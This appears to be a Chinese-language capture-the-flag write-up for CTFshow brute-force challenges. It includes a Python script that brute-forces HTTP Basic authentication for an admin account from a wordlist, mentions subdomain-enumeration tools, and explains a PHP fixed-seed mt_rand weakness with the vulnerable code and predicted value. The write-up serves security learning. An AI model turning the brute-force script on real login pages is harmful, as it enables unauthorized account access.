# CTFshow 爆破（21-28）

## ??Web 21

**不会写python脚本，插个眼**

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-11-20 19:16:49
# @Last Modified by:   h1xa
# @Last Modified time: 2020-11-20 20:28:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

import time
import requests
import base64

url = 'http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php'

password = []

with open("1.txt", "r") as f:  
	while True:
	    data = f.readline() 
	    if data:
	    	password.append(data)
	    else:
	      break
	    


for p in password:
	strs = 'admin:'+ p[:-1]
	header={
		'Authorization':'Basic {}'.format(base64.b64encode(strs.encode('utf-8')).decode('utf-8'))
	}
	rep =requests.get(url,headers=header)
	time.sleep(0.2)
	if rep.status_code ==200:
		print(rep.text)
		break
```





## Web 22 爆破子域名

Layer子域名挖掘机 或 Oneforall工具





## Web 24 伪随机数

这个题很有意思，代码如下：

```php
<?php
error_reporting(0);

include("flag.php");
if (isset($_GET['r'])) {
    $r = $_GET['r'];
    mt_srand(372619038);
    if (intval($r) === intval(mt_rand())) {
        echo $flag;
    }
} else {
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
?>
```

**php伪随机数`mt_rand()`函数**

先是mt_srand(372619038)，播种了一个随机数种子，然后比较用户传的GET参数r与否与mt_rand()生成的随机数一样，若一样则输出flag。

逻辑很简单，只要发送的GET请求中的参数与后台生成的随机数一样即可获取flag。

这里存在一个伪随机数漏洞，在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点。

上面已经用一个固定数字播种了随机数，mt_srand(372619038)，所以只要在同一的php版本中，复现一下，也用mt_srand(372619038)，播种随机数种子，再用mt_rand()生成随机数，得到的随机数都是一样的

所以第一步，用Burp随便传一个r过去，，查看网络中的响应包，获取靶机php版本，再在自己主机上搭建同样版本的php环境，播种同样的随机数种子，生成的随机数当作参数r的值发送请求，即可获取flag。r值为：url/?r=1155388967

其实这儿用一些在线的php运行平台就可以。

### 官方说明：

mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的。


